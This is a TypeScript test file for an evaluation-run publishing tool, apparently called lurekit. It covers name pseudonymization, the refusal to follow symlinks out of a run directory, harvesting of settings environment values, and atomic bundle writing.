    expect(servers.slice(0, 4).map((s) => s.name)).toEqual(['<user-mcp-1>', '<user-mcp-3>', '<user-mcp-5>', '<user-mcp-6>']);
    expect(new Set(names.values()).size).toBe(3000);
    // A second call with the same map continues the numbering.
    const more = { mcp_servers: [{ name: 'srv-new', status: 'x', source: 'user' }, { name: 'srv-0', status: 'x', source: 'user' }] };
    pseudonymizeMcpServers(more, names, reserved);
    expect(more.mcp_servers.map((s) => s.name)).toEqual(['<user-mcp-3003>', '<user-mcp-1>']);
  });
});

// --- I/O ------------------------------------------------------------------------------------

let tmp: string;
beforeEach(() => {
  tmp = mkScratchSync('aab-gate-io-');
});
afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

function trySymlink(target: string, link: string, ctx: { skip: (msg: string) => void }): void {
  try {
    symlinkSync(target, link);
  } catch (err) {
    const code = (err as NodeJS.ErrnoException).code;
    // Windows without admin / Developer Mode cannot create symlinks: skipped, never a silent pass.
    if (process.platform === 'win32' && (code === 'EPERM' || code === 'EACCES')) ctx.skip(`symlinkSync failed with ${code}`);
    throw err;
  }
}

describe('readRunDir never follows symlinks (ADR-0017 "Run-dir reading")', () => {
  it('skips a symlinked evidence file, repetition dir and canary metadata, with warnings', (ctx) => {
    const run = path.join(tmp, 'run');
    const outside = path.join(tmp, 'outside');
    mkdirSync(path.join(outside, 'rep'), { recursive: true });
    writeFileSync(path.join(outside, 'secret.json'), '{"leak":true}');
    writeFileSync(path.join(outside, 'rep', 'evidence.json'), '{"leak":true}');
    mkdirSync(path.join(run, 'AAB-001', '0'), { recursive: true });
    mkdirSync(path.join(run, 'AAB-002'), { recursive: true });
    writeFileSync(path.join(run, 'manifest.json'), JSON.stringify(manifest()));
    writeFileSync(path.join(run, 'AAB-001', '0', 'evidence.json'), '{}');
    trySymlink(path.join(outside, 'secret.json'), path.join(run, 'AAB-001', '0', 'canary_command.canary.json'), ctx);
    trySymlink(path.join(outside, 'rep'), path.join(run, 'AAB-002', '0'), ctx);
    mkdirSync(path.join(run, 'AAB-002', '1'));
    trySymlink(path.join(outside, 'secret.json'), path.join(run, 'AAB-002', '1', 'evidence.json'), ctx);

    const c = readRunDir(run);
    expect(c.evidence.map((e) => e.rel)).toEqual(['AAB-001/0/evidence.json']);
    expect(c.canaryMeta).toEqual([]);
    expect(JSON.stringify(c)).not.toContain('leak');
    expect(c.warnings).toEqual([
      'publish: skipped symlink AAB-001/0/canary_command.canary.json (symlinks in a run dir are never followed)',
      'publish: skipped symlink AAB-002/0 (symlinks in a run dir are never followed)',
      'publish: skipped symlink AAB-002/1/evidence.json (symlinks in a run dir are never followed)',
    ]);
  });

  it('B12: harvests the settings env of kept repetitions only; a symlinked file is skipped, invalid JSON fails closed', (ctx) => {
    const run = path.join(tmp, 'run');
    for (const id of ['AAB-001', 'AAB-002']) {
      mkdirSync(path.join(run, id, '0'), { recursive: true });
      writeFileSync(path.join(run, id, '0', 'evidence.json'), '{}');
    }
    writeFileSync(path.join(run, 'manifest.json'), JSON.stringify(manifest()));
    writeFileSync(path.join(run, 'AAB-001', '0', 'claude-settings.json'), JSON.stringify({ env: { A_SECRET_VALUE: 'value-one', NUM: 1 }, hooks: {} }));
    writeFileSync(path.join(run, 'AAB-002', '0', 'claude-settings.json'), JSON.stringify({ env: { B_VALUE: 'value-two' } }));
    const c = readRunDir(run);
    expect(c.settingsEnv).toEqual([
      { rel: 'AAB-001/0/claude-settings.json', name: 'A_SECRET_VALUE', value: 'value-one' },
      { rel: 'AAB-002/0/claude-settings.json', name: 'B_VALUE', value: 'value-two' },
    ]);
    expect(c.evidence.map((e) => e.rel)).toEqual(['AAB-001/0/evidence.json', 'AAB-002/0/evidence.json']);
    // A withheld/excluded scenario's settings file is not read.
    expect(readRunDir(run, { skipScenarios: ['AAB-001'] }).settingsEnv).toEqual([{ rel: 'AAB-002/0/claude-settings.json', name: 'B_VALUE', value: 'value-two' }]);
    // Symlink: skipped with the usual warning, nothing harvested from it.
    writeFileSync(path.join(tmp, 'outside.json'), JSON.stringify({ env: { LEAK: 'outside-value' } }));
    rmSync(path.join(run, 'AAB-002', '0', 'claude-settings.json'));
    trySymlink(path.join(tmp, 'outside.json'), path.join(run, 'AAB-002', '0', 'claude-settings.json'), ctx);
    const linked = readRunDir(run);
    expect(linked.settingsEnv).toEqual([{ rel: 'AAB-001/0/claude-settings.json', name: 'A_SECRET_VALUE', value: 'value-one' }]);
    expect(linked.warnings).toEqual(['publish: skipped symlink AAB-002/0/claude-settings.json (symlinks in a run dir are never followed)']);
    expect(JSON.stringify(linked)).not.toContain('outside-value');
    // Invalid JSON fails closed.
    writeFileSync(path.join(run, 'AAB-001', '0', 'claude-settings.json'), '{ not json');
    expect(() => readRunDir(run)).toThrow(/AAB-001\/0\/claude-settings\.json is not valid JSON/);
  });

  it('B12: the shipped demo dir (no evidence files) is refused without --allow-no-evidence and published with it', async () => {
    const out: string[] = [];
    const err: string[] = [];
    const deps: CliDeps = {
      now: () => '2026-11-05T00:00:00.000Z',
      newRunId: () => 'aab-unused',
      adapterFor: () => {
        throw new Error('publish must not need an adapter');
      },
      cwd: () => ROOT,
      stdout: (s) => out.push(s),
      stderr: (s) => err.push(s),
      homeDir: () => '/home/lurekit-maintainer',
      env: () => ({}),
    };
    const demo = path.join('demo', 'aab-20261103071018-88a78d8f');
    const outDir = path.join(tmp, 'demo-bundle');
    const before = readdirSync(path.join(ROOT, demo)).sort();
    expect(await main(['publish', demo, '--out', outDir], deps)).toBe(1);
    expect(err.join('')).toBe(
      `publish: no evidence files under ${demo} (0 of 63 planned repetitions); a bundle without evidence cannot be audited; nothing written\n` +
        `next: lurekit publish ${demo} --allow-no-evidence   (report-only copy, e.g. the shipped demo)\n`,
    );
    expect(existsSync(outDir)).toBe(false);
    const errBefore = err.join('');
    expect(await main(['publish', demo, '--out', outDir, '--allow-no-evidence'], deps)).toBe(0);
    expect(err.join('')).toBe(errBefore); // only the first attempt wrote to stderr
    const text = out.join('');
    expect(text).toContain('evidence: 0 of 63 file(s) (--allow-no-evidence)\n');
    expect(text).toContain(`\nNext: lurekit report ${path.relative(ROOT, outDir)}\n      cite it as described in the publishing guide ("Citing a bundle")\n`);
    expect(readFileSync(path.join(outDir, 'index.md'), 'utf8')).toContain('## Evidence\n\nno evidence files published (--allow-no-evidence): 0 of 63');
    expect(readdirSync(path.join(ROOT, demo)).sort()).toEqual(before); // never touched
  });

  it('a symlinked manifest.json is an error', (ctx) => {
    const run = path.join(tmp, 'run');
    mkdirSync(run, { recursive: true });
    writeFileSync(path.join(tmp, 'm.json'), JSON.stringify(manifest()));
    trySymlink(path.join(tmp, 'm.json'), path.join(run, 'manifest.json'), ctx);
    expect(() => readRunDir(run)).toThrow(/symlink/);
  });
});

describe('writeBundle is atomic (ADR-0017 "Atomic bundle")', () => {
  it('writes through <out>.partial and renames; no partial dir remains', () => {
    const out = path.join(tmp, 'bundle');
    writeBundle(out, [{ rel: 'index.md', text: 'x' }, { rel: 'A/0/evidence.json', text: '{}' }]);
    expect(readFileSync(path.join(out, 'A', '0', 'evidence.json'), 'utf8')).toBe('{}');
    expect(existsSync(`${out}.partial`)).toBe(false);
  });

  it('an existing empty out dir is replaced', () => {
    const out = path.join(tmp, 'bundle');
    mkdirSync(out);
    writeBundle(out, [{ rel: 'index.md', text: 'x' }]);
    expect(readdirSync(out)).toEqual(['index.md']);
  });

  it('a failure mid-write leaves neither the out dir nor the partial dir', () => {
    const out = path.join(tmp, 'bundle');
    // `a` is written as a file, then `a/b` needs it to be a directory: the write throws.
    expect(() => writeBundle(out, [{ rel: 'a', text: 'x' }, { rel: 'a/b', text: 'y' }])).toThrow();
    expect(existsSync(out)).toBe(false);
    expect(existsSync(`${out}.partial`)).toBe(false);
  });

  it('refuses a non-empty out dir and a pre-existing partial dir (never deletes either)', () => {
    const out = path.join(tmp, 'bundle');
    mkdirSync(out);
    writeFileSync(path.join(out, 'keep'), 'k');
    expect(() => writeBundle(out, [{ rel: 'index.md', text: 'x' }])).toThrow(/not empty/);
    rmSync(out, { recursive: true });
    mkdirSync(`${out}.partial`);
    writeFileSync(path.join(`${out}.partial`, 'keep'), 'k');
    expect(() => writeBundle(out, [{ rel: 'index.md', text: 'x' }])).toThrow(/staging directory/);
    expect(readFileSync(path.join(`${out}.partial`, 'keep'), 'utf8')).toBe('k');
  });
});
